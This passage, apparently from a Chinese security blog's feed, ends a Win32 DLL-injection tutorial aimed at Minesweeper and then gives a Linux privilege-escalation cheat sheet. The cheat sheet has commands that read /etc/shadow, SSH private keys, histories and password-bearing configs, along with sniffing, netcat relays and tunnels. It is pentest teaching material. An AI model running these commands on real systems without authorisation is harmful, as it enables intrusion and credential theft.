class="hljs-keyword">pragma</span> comment(linker,<span class="hljs-string">&quot;/section:Shared,rws&quot;</span>)</span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span>  __declspec(dllexport) <span class="hljs-type">void</span> <span class="hljs-title function_">SetData</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, DWORD dwDataLen)</span><br>&#123;<br>ZeroMemory(g_buffer, <span class="hljs-number">0x1000</span>);<br><span class="hljs-built_in">memcpy</span>(g_buffer, buf, dwDataLen);<br>&#125;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span>  __declspec(dllexport) <span class="hljs-type">void</span> <span class="hljs-title function_">GetData</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf)</span><br>&#123;    <br><span class="hljs-built_in">memcpy</span>(buf, g_buffer, <span class="hljs-number">0x1000</span>);<br>&#125;<br><br>BOOL APIENTRY <span class="hljs-title function_">DllMain</span><span class="hljs-params">( HMODULE hModule,</span><br><span class="hljs-params">  DWORD  ul_reason_for_call,</span><br><span class="hljs-params">  LPVOID lpReserved</span><br><span class="hljs-params">  )</span><br>&#123;<br><span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>&#123;<br><span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>&#123;<br><span class="hljs-comment">// 区分是目标进程（游戏）还是控制进程（WG）</span><br><span class="hljs-comment">// 如果是扫雷进程(winmine.exe)则开始接收数据</span><br><span class="hljs-type">char</span> szModule[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>GetModuleFileNameA(<span class="hljs-literal">NULL</span>, szModule, MAX_PATH);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(szModule, <span class="hljs-string">&quot;winmine&quot;</span>) != <span class="hljs-literal">NULL</span>)<br>&#123;            <br>MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;扫雷程序注入DLL成功&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, MB_OK);<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(g_buffer, <span class="hljs-string">&quot;quit&quot;</span>) == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>; <span class="hljs-comment">// 控制程序给的退出信号</span><br>MessageBoxA(<span class="hljs-literal">NULL</span>, g_buffer, szModule, MB_OK);<br>&#125;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br><span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br><span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>使用前需要将扫雷、DLL、控制端EXE放在同一个目录下。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这是滴水三期初级班的过程，这篇文章前后参考了课件、网上的各种帖子和Github上gh0stkey师傅的<a href="https://github.com/gh0stkey/Binary-Learning">项目</a>，万分感谢。</p><p>挂一漏万，发现自己的内容被搬运的师傅请联系我补上。</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>滴水学习</category>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>Win32</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux提权一文通</title>
    <link href="/2022/02/01/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux/"/>
    <url>/2022/02/01/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux提权一文通"><a href="#Linux提权一文通" class="headerlink" title="Linux提权一文通"></a>Linux提权一文通</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>原文来自于<a href="https://www.freebuf.com/articles/251884.html">https://www.freebuf.com/articles/251884.html</a></p><p>感觉很多都是机翻，还有些大大小小的格式问题</p><p>遂去外网找到原文重新翻译排版了一遍，同时也参考了原文的翻译</p><h2 id="0x01-Linux提权描述"><a href="#0x01-Linux提权描述" class="headerlink" title="0x01 Linux提权描述"></a>0x01 Linux提权描述</h2><p>大多数计算机系统设计为可与多个用户一起使用。特权是指允许用户执行的操作。普通特权包括查看和编辑文件或修改系统文件。特权升级意味着用户获得他们无权获得的特权。这些特权可用于删除文件，查看私人信息或安装不需要的程序，例如病毒。通常，当系统存在允许绕过安全性的错误或对使用方法的设计假设存在缺陷时，通常会发生这种情况。</p><p>特权提升是利用操作系统或软件应用程序中的错误，设计缺陷等等来获得对通常受到应用程序或用户保护的资源的更高访问权限的行为。结果是，具有比应用程序开发人员或系统管理员想要的特权更多的应用程序可以执行未经授权的操作。</p><p>特权升级有两种类型:<strong>水平</strong>和<strong>垂直。</strong>在<strong>水平升级中</strong>，您从一个用户转移到另一个用户。在这种情况下，两个用户都是通用的，而在<strong>垂直</strong>方式中，我们将特权从普通用户提升为<strong>管理员</strong></p><p>即用户无法访问（读取&#x2F;写入&#x2F;执行）不允许访问的文件。但是，超级用户（root）可以访问系统上存在的所有文件。 为了更改任何重要的配置或进行进一步的攻击，我们需要在任何基于Linux的系统上获得root用户访问权限。</p><h2 id="0x02-Linux系统权限提升前的信息收集"><a href="#0x02-Linux系统权限提升前的信息收集" class="headerlink" title="0x02 Linux系统权限提升前的信息收集"></a>0x02 Linux系统权限提升前的信息收集</h2><p><strong>信息收集非常关键。</strong></p><p>（Linux）特权提升的Tips:</p><ul><li><strong>信息收集</strong>-更多的信息收集，信息收集是整个渗透测试过程的</li><li>整理信息-<strong>分析收集的信息</strong>和整理信息。</li><li>搜索漏洞- 知道要搜索什么以及在哪里可以<strong>找到</strong>漏洞利用代码。</li><li>修改代码-<strong>修改</strong>漏洞利用程序，使其适合目前的渗透。并非每种漏洞都能为“现成”的每个系统工作。漏洞看环境</li><li>尝试攻击-为（很多）<strong>尝试和错误</strong>做好准备。</li></ul><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><h4 id="发行类型-amp-版本"><a href="#发行类型-amp-版本" class="headerlink" title="发行类型&amp;版本"></a>发行类型&amp;版本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/issue <br><span class="hljs-built_in">cat</span> /etc/*-release <br><span class="hljs-built_in">cat</span> /etc/lsb-release <span class="hljs-comment"># Debian based </span><br><span class="hljs-built_in">cat</span> /etc/redhat-release <span class="hljs-comment"># Redhat based</span><br></code></pre></td></tr></table></figure><h4 id="内核版本版本号-amp-系统位数"><a href="#内核版本版本号-amp-系统位数" class="headerlink" title="内核版本版本号&amp;系统位数"></a>内核版本版本号&amp;系统位数</h4><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tcl">cat /<span class="hljs-keyword">proc</span>/version<span class="hljs-title"> </span><br><span class="hljs-title">uname</span> -a<span class="hljs-title"> </span><br><span class="hljs-title">uname</span> -mrs<span class="hljs-title"> </span><br><span class="hljs-title">rpm</span> -q<span class="hljs-title"> </span><br><span class="hljs-title">kernel</span> <span class="hljs-title"></span><br><span class="hljs-title">dmesg</span> |<span class="hljs-title"> grep</span> Linux<span class="hljs-title"> </span><br><span class="hljs-title">ls</span> /boot |<span class="hljs-title"> grep</span> vmlinuz-<br></code></pre></td></tr></table></figure><h4 id="环境变量（可能存在密码或API密钥-）"><a href="#环境变量（可能存在密码或API密钥-）" class="headerlink" title="环境变量（可能存在密码或API密钥 ）"></a>环境变量（可能存在密码或API密钥 ）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/profile <br><span class="hljs-built_in">cat</span> /etc/bashrc <br><span class="hljs-built_in">cat</span> ~/.bash_profile <br><span class="hljs-built_in">cat</span> ~/.bashrc <br><span class="hljs-built_in">cat</span> ~/.bash_logout <br><span class="hljs-built_in">env</span><br><span class="hljs-built_in">set</span><br></code></pre></td></tr></table></figure><h4 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h4><p><strong>如果对该变量内的任何文件夹都具有写权限，则可以劫持某些库或二进制文件:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><h5 id="有打印机吗？"><a href="#有打印机吗？" class="headerlink" title="有打印机吗？"></a>有打印机吗？</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lpstat -a<br></code></pre></td></tr></table></figure><h3 id="应用与服务"><a href="#应用与服务" class="headerlink" title="应用与服务"></a>应用与服务</h3><p><strong>获取运行的服务和归属的用户</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">ps</span> aux <br><span class="hljs-built_in">ps</span> <span class="hljs-literal">-ef</span> <br>top <br><span class="hljs-built_in">cat</span> /etc/services<br></code></pre></td></tr></table></figure><p><strong>以root身份运行的服务</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ps</span> aux | <span class="hljs-keyword">grep</span> root <br><span class="hljs-keyword">ps</span> -ef | <span class="hljs-keyword">grep</span> root<br></code></pre></td></tr></table></figure><p><strong>安装的程序、版本信息、运行状态</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">ls -alh <span class="hljs-regexp">/usr/</span>bin/ <br>ls -alh <span class="hljs-regexp">/sbin/</span> <br>dpkg -l <br>rpm -qa <br>ls -alh <span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/apt/</span>archivesO <br>ls -alh <span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/yum/</span><br></code></pre></td></tr></table></figure><p><strong>服务器配置信息（配置错误和脆弱组件）</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>syslog.conf<br>cat <span class="hljs-regexp">/etc/</span>chttp.conf<br>cat <span class="hljs-regexp">/etc/</span>lighttpd.conf<br>cat <span class="hljs-regexp">/etc/</span>cups/cupsd.conf<br>cat <span class="hljs-regexp">/etc/i</span>netd.conf cat <span class="hljs-regexp">/etc/</span>apache2/apache2.conf<br>cat <span class="hljs-regexp">/etc/my</span>.conf cat <span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/conf/</span>httpd.conf<br>cat <span class="hljs-regexp">/opt/</span>lampp<span class="hljs-regexp">/etc/</span>httpd.conf ls -aRl <span class="hljs-regexp">/etc/</span> | awk <span class="hljs-string">&#x27;$1 ~ /^.*r.*/</span><br></code></pre></td></tr></table></figure><p><strong>计划了哪些工作？（计划任务）</strong> </p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gradle">crontab -l<br>ls -alh <span class="hljs-regexp">/var/</span>spool/cron<br>ls -al <span class="hljs-regexp">/etc/</span> | <span class="hljs-keyword">grep</span> cron<br>ls -al <span class="hljs-regexp">/etc/</span>cron*<br>cat <span class="hljs-regexp">/etc/</span>cron*<br>cat <span class="hljs-regexp">/etc/</span>at.allow<br>cat <span class="hljs-regexp">/etc/</span>at.deny<br>cat <span class="hljs-regexp">/etc/</span>cron.allow<br>cat <span class="hljs-regexp">/etc/</span>cron.deny<br>cat <span class="hljs-regexp">/etc/</span>crontab<br>cat <span class="hljs-regexp">/etc/</span>anacrontab<br>cat <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>crontabs/root<br></code></pre></td></tr></table></figure><p><strong>是否有纯文本用户名和&#x2F;或密码？</strong></p><ul><li>检查Web服务器连接到数据库的文件（config.php或类似文件）</li><li>检查数据库以获取可能被重用的管理员密码</li><li>检查弱口令</li></ul><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">grep</span> -i user [filename]<br><span class="hljs-keyword">grep</span> -i pass [filename]<br><span class="hljs-keyword">grep</span> -C <span class="hljs-number">5</span> <span class="hljs-string">&quot;password&quot;</span> [filename]<br>find . -name <span class="hljs-string">&quot;*.php&quot;</span> -<span class="hljs-keyword">print</span><span class="hljs-number">0</span> | xargs -<span class="hljs-number">0</span> <span class="hljs-keyword">grep</span> -i -n <span class="hljs-string">&quot;var $password&quot;</span><br></code></pre></td></tr></table></figure><h3 id="通信与网络"><a href="#通信与网络" class="headerlink" title="通信与网络"></a>通信与网络</h3><p><strong>查看网卡</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">ifconfig -a <br>cat <span class="hljs-regexp">/etc/</span>network/interfaces <br>cat <span class="hljs-regexp">/etc/</span>sysconfig/network<br></code></pre></td></tr></table></figure><p><strong>网络配置、网络信息、DHCP服务器、DNS服务器、网关</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>resolv.conf <br>cat <span class="hljs-regexp">/etc/</span>sysconfig/network <br>cat <span class="hljs-regexp">/etc/</span>networks <br>iptables -L hostname dnsdomainname<br></code></pre></td></tr></table></figure><p><strong>通信状况</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">netstat</span> -anlp<br><span class="hljs-attribute">netstat</span> -ano  <br><span class="hljs-attribute">lsof</span> -i <br><span class="hljs-attribute">lsof</span> -i :<span class="hljs-number">80</span> grep <span class="hljs-number">80</span> /etc/services <br><span class="hljs-attribute">netstat</span> -antup <br><span class="hljs-attribute">netstat</span> -antpx <br><span class="hljs-attribute">netstat</span> -tulpn <br><span class="hljs-attribute">chkconfig</span> --list <br><span class="hljs-attribute">chkconfig</span> --list | grep <span class="hljs-number">3</span>:<span class="hljs-literal">on</span> last w<br></code></pre></td></tr></table></figure><p><strong>缓存了什么？IP和&#x2F;或MAC地址</strong></p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pf">arp -e <br><span class="hljs-keyword">route</span> <br><span class="hljs-keyword">route</span> -nee<br></code></pre></td></tr></table></figure><p><strong>数据包嗅探</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcpdump</span> tcp dst <span class="hljs-number">192.168.1.7</span> <span class="hljs-number">80</span> and tcp dst <span class="hljs-number">10.5.5.252</span> <span class="hljs-number">21</span><br></code></pre></td></tr></table></figure><p>注意:tcpdump tcp dst [ip] [端口]和tcp dst [ip] [端口]</p><h5 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h5><p>FPipe.exe -l [本地端口] -r [远程端口] -s [本地端口] [本地IP]</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">FPipe</span>.exe -l <span class="hljs-number">80</span> -r <span class="hljs-number">80</span> -s <span class="hljs-number">80</span> <span class="hljs-number">192.168.1.7</span><br></code></pre></td></tr></table></figure><p>ssh-[L &#x2F; R] [本地端口]:[远程IP]:[远程端口] [本地用户] @ [本地IP]</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -L <span class="hljs-number">8080</span>:<span class="hljs-number">127.0.0.1:80</span> root@<span class="hljs-number">192.168.1.7</span> # Local Port ssh -R <span class="hljs-number">8080</span>:<span class="hljs-number">127.0.0.1:80</span> root@<span class="hljs-number">192.168.1.7</span> # Remote Port<br></code></pre></td></tr></table></figure><p>mknod backpipe p; nc -l -p [远程端口] &lt;backpipe | nc [本地IP] [本地端口]&gt; backpipe</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mknod</span> backpipe p ; nc -l -p <span class="hljs-number">8080</span> &lt; backpipe | nc <span class="hljs-number">10.5.5.151</span> <span class="hljs-number">80</span> &gt;backpipe # Port Relay<br><br><span class="hljs-attribute">mknod</span> backpipe p ; nc -l -p <span class="hljs-number">8080</span> <span class="hljs-number">0</span> &amp; &lt; backpipe | tee -a inflow | nc localhost <span class="hljs-number">80</span> | tee -a outflow <span class="hljs-number">1</span>&gt;backpipe # Proxy (Port <span class="hljs-number">80</span> to <span class="hljs-number">8080</span>)<br><br><span class="hljs-attribute">mknod</span> backpipe p ; nc -l -p <span class="hljs-number">8080</span> <span class="hljs-number">0</span> &amp; &lt; backpipe | tee -a inflow | nc localhost <span class="hljs-number">80</span> | tee -a outflow &amp; <span class="hljs-number">1</span>&gt;backpipe # Proxy monitor (Port <span class="hljs-number">80</span> to <span class="hljs-number">8080</span>)<br></code></pre></td></tr></table></figure><p>可以使用隧道吗？在本地远程发送命令</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">ssh -D 127.0.0.1:9050 -N <span class="hljs-comment">[username]</span>@<span class="hljs-comment">[ip]</span> proxychains ifconfig<br></code></pre></td></tr></table></figure><h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><h5 id="你是谁？谁登录？谁已经登录？那里还有谁？谁能做什么？"><a href="#你是谁？谁登录？谁已经登录？那里还有谁？谁能做什么？" class="headerlink" title="你是谁？谁登录？谁已经登录？那里还有谁？谁能做什么？"></a>你是谁？谁登录？谁已经登录？那里还有谁？谁能做什么？</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">id</span><br><span class="hljs-built_in">who</span><br>w<br>last<br><span class="hljs-built_in">cat</span> /etc/passwd | <span class="hljs-built_in">cut</span> -d: -f1 <span class="hljs-comment"># List of users</span><br>grep -v -E <span class="hljs-string">&quot;^#&quot;</span> /etc/passwd | awk -F: <span class="hljs-string">&#x27;$3 == 0 &#123; print $1&#125;&#x27;</span> <span class="hljs-comment"># List of super users</span><br>awk -F: <span class="hljs-string">&#x27;($3 == &quot;0&quot;) &#123;print&#125;&#x27;</span> /etc/passwd <span class="hljs-comment"># List of super users</span><br><span class="hljs-built_in">cat</span> /etc/sudoers<br>sudo -l<br></code></pre></td></tr></table></figure><p><strong>系统账户信息</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd<br><span class="hljs-built_in">cat</span> /etc/group<br><span class="hljs-built_in">cat</span> /etc/shadow<br><span class="hljs-built_in">ls</span> -alh /var/mail/<br></code></pre></td></tr></table></figure><p><strong>home&#x2F;root目录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -ahlR /root/<br><span class="hljs-built_in">ls</span> -ahlR /home/<br></code></pre></td></tr></table></figure><p><strong>配置文件、日志文件、可能存储口令的位置</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/apache2/config.inc<br><span class="hljs-built_in">cat</span> /var/lib/mysql/mysql/user.MYD<br><span class="hljs-built_in">cat</span> /root/anaconda-ks.cfg<br></code></pre></td></tr></table></figure><p><strong>执行命令的历史记录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">cat</span> ~/.nano_history<br><span class="hljs-built_in">cat</span> ~/.atftp_history<br><span class="hljs-built_in">cat</span> ~/.mysql_history<br><span class="hljs-built_in">cat</span> ~/.php_history<br></code></pre></td></tr></table></figure><p><strong>用户信息？</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> ~/.bashrc<br><span class="hljs-built_in">cat</span> ~/.profile<br><span class="hljs-built_in">cat</span> /var/mail/root<br><span class="hljs-built_in">cat</span> /var/spool/mail/root<br></code></pre></td></tr></table></figure><p><strong>私钥信息</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> ~/.ssh/authorized_keys<br><span class="hljs-built_in">cat</span> ~/.ssh/identity.pub<br><span class="hljs-built_in">cat</span> ~/.ssh/identity<br><span class="hljs-built_in">cat</span> ~/.ssh/id_rsa.pub<br><span class="hljs-built_in">cat</span> ~/.ssh/id_rsa<br><span class="hljs-built_in">cat</span> ~/.ssh/id_dsa.pub<br><span class="hljs-built_in">cat</span> ~/.ssh/id_dsa<br><span class="hljs-built_in">cat</span> /etc/ssh/ssh_config<br><span class="hljs-built_in">cat</span> /etc/ssh/sshd_config<br><span class="hljs-built_in">cat</span> /etc/ssh/ssh_host_dsa_key.pub<br><span class="hljs-built_in">cat</span> /etc/ssh/ssh_host_dsa_key<br><span class="hljs-built_in">cat</span> /etc/ssh/ssh_host_rsa_key.pub<br><span class="hljs-built_in">cat</span> /etc/ssh/ssh_host_rsa_key<br><span class="hljs-built_in">cat</span> /etc/ssh/ssh_host_key.pub<br><span class="hljs-built_in">cat</span> /etc/ssh/ssh_host_key<br></code></pre></td></tr></table></figure><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><h5 id="可以在-x2F-etc-x2F-中写入哪些配置文件？能够重新配置服务？"><a href="#可以在-x2F-etc-x2F-中写入哪些配置文件？能够重新配置服务？" class="headerlink" title="可以在&#x2F;etc&#x2F;中写入哪些配置文件？能够重新配置服务？"></a>可以在&#x2F;etc&#x2F;中写入哪些配置文件？能够重新配置服务？</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -aRl /etc/ | awk <span class="hljs-string">&#x27;$1 ~ /^.*w.*/&#x27;</span> 2&gt;/dev/null <span class="hljs-comment"># Anyone</span><br><span class="hljs-built_in">ls</span> -aRl /etc/ | awk <span class="hljs-string">&#x27;$1 ~ /^..w/&#x27;</span> 2&gt;/dev/null <span class="hljs-comment"># Owner</span><br><span class="hljs-built_in">ls</span> -aRl /etc/ | awk <span class="hljs-string">&#x27;$1 ~ /^.....w/&#x27;</span> 2&gt;/dev/null <span class="hljs-comment"># Group</span><br><span class="hljs-built_in">ls</span> -aRl /etc/ | awk <span class="hljs-string">&#x27;$1 ~ /w.$/&#x27;</span> 2&gt;/dev/null <span class="hljs-comment"># Other</span><br>find /etc/ -readable -<span class="hljs-built_in">type</span> f 2&gt;/dev/null <span class="hljs-comment"># Anyone</span><br>find /etc/ -readable -<span class="hljs-built_in">type</span> f -maxdepth 1 2&gt;/dev/null <span class="hljs-comment"># Anyone</span><br></code></pre></td></tr></table></figure><h5 id="在-x2F-var-x2F-中可以找到什么？"><a href="#在-x2F-var-x2F-中可以找到什么？" class="headerlink" title="在&#x2F;var&#x2F;中可以找到什么？"></a>在&#x2F;var&#x2F;中可以找到什么？</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -alh /var/log <span class="hljs-built_in">ls</span> -alh /var/mail<br><span class="hljs-built_in">ls</span> -alh /var/spool<br><span class="hljs-built_in">ls</span> -alh /var/spool/lpd<br><span class="hljs-built_in">ls</span> -alh /var/lib/pgsql<br><span class="hljs-built_in">ls</span> -alh /var/lib/mysql<br><span class="hljs-built_in">cat</span> /var/lib/dhcp3/dhclient.leases<br></code></pre></td></tr></table></figure><p><strong>网站上是否有任何设置&#x2F;文件（隐藏）？有数据库信息的任何设置文件吗？</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -alhR /var/www/<br><span class="hljs-built_in">ls</span> -alhR /srv/www/htdocs/<br><span class="hljs-built_in">ls</span> -alhR /usr/local/www/apache22/data/<br><span class="hljs-built_in">ls</span> -alhR /opt/lampp/htdocs/<br><span class="hljs-built_in">ls</span> -alhR /var/www/html/<br></code></pre></td></tr></table></figure><p><strong>日志文件中是否有任何内容（可以帮助“本地文件包含”!）</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/httpd/logs/access_log<br><span class="hljs-built_in">cat</span> /etc/httpd/logs/access.log<br><span class="hljs-built_in">cat</span> /etc/httpd/logs/error_log<br><span class="hljs-built_in">cat</span> /etc/httpd/logs/error.log<br><span class="hljs-built_in">cat</span> /var/log/apache2/access_log<br><span class="hljs-built_in">cat</span> /var/log/apache2/access.log<br><span class="hljs-built_in">cat</span> /var/log/apache2/error_log<br><span class="hljs-built_in">cat</span> /var/log/apache2/error.log<br><span class="hljs-built_in">cat</span> /var/log/apache/access_log<br><span class="hljs-built_in">cat</span> /var/log/apache/access.log<br><span class="hljs-built_in">cat</span> /var/log/auth.log<br><span class="hljs-built_in">cat</span> /var/log/chttp.log<br><span class="hljs-built_in">cat</span> /var/log/cups/error_log<br><span class="hljs-built_in">cat</span> /var/log/dpkg.log<br><span class="hljs-built_in">cat</span> 